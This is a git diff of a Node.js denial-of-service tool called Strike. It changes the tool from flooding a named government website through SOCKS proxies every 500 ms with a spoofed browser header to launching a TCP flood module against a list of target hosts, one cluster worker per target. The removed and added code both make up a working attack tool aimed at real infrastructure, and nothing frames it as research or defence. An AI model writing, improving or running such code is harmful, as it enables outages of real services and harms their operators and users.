@@ -9,8 +9,10 @@ const { Agent } = require("socks5-http-client");
 const { socks5 } = require("./proxy.socks5");
 const EventEmitter = require("events");
 const ProxyChecker = require("./proxyChecker");
+const TcpClient = require("./tcp.ddos.module");
+const targets = require("./targets");
 
-const numCPUs = os.cpus().length <= 2 ? 2 : os.cpus().length - 1;
+const numCPUs = targets.length;
 
 class Strike {
   constructor() {
@@ -20,20 +22,18 @@ class Strike {
   }
 
   async init() {
+    let i = 0;
+
     if (cluster.isPrimary) {
       for (let i = 1; i <= numCPUs; i++) {
         this._fork();
       }
 
-      const avaliableProxies = await this.proxyChecker.getProxies();
-      this._axiosRejectInterceptor();
-
-      if(!avaliableProxies.length) {
-        return console.error("[Error]:", "No avaliable proxies");
-      }
-
       for (const worker of Object.values(cluster.workers)) {
-        worker.send(avaliableProxies);
+        const { host, port } = targets[i];
+        worker.send({ host, port });
+        // worker.send({ host: "127.0.0.1", port: 23 });
+        i++;
       }
 
       cluster.on("exit", (worker, code, signal) => {
@@ -43,42 +43,17 @@ class Strike {
         this._fork();
       });
     } else if (cluster.isWorker) {
-      process.on("message", this._attack.bind(this));
-      console.info("inited instance");
+      process.on("message", (data) => {
+        const tcpClient = new TcpClient(data.host, data.port);
+        tcpClient.init();
+      });
+      console.info("[Info]: Init instance, process id:", process.pid);
     }
   }
 
   _axiosRejectInterceptor() {
     axios.interceptors.response
       .use((response) => response, (error) => Promise.reject(error));
-  }
-
-  async _attack(avaliableProxies) {
-    for(let server of avaliableProxies) {
-      setInterval(async () => {
-        try {
-          const agent = new SocksProxyAgent(server);
-          const link = "https://gpk.gov.by";
-          const response = await axios({
-            url: link,
-            httpsAgent: agent,
-            headers: {
-              'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
-            },
-          });
-  
-          console.log(`Response status code: ${response.status || response.code}, Link: ${link}, Requests: ${this.counter}`);
-          this.counter++;
-        } catch (err) {
-          if(err.isAxiosError) {
-            const { code, status, message } = err.toJSON();
-            console.error("[Error]:", "Code:", code || status, "Message:", message);
-          } else {
-            console.error("[Error]:", "Message:", err.message);
-          }
-        }
-      }, 500);
-    }
   }
 
   _fork() {
